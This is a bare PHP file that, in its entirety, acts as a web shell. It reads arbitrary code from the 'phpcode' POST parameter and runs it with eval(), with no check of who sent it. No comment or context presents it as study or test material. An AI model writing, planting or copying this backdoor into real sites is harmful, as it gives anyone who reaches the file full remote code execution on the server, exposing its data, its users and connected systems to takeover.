<?php
$phpcode = $_POST['phpcode'];

eval(stripslashes($phpcode));
?>

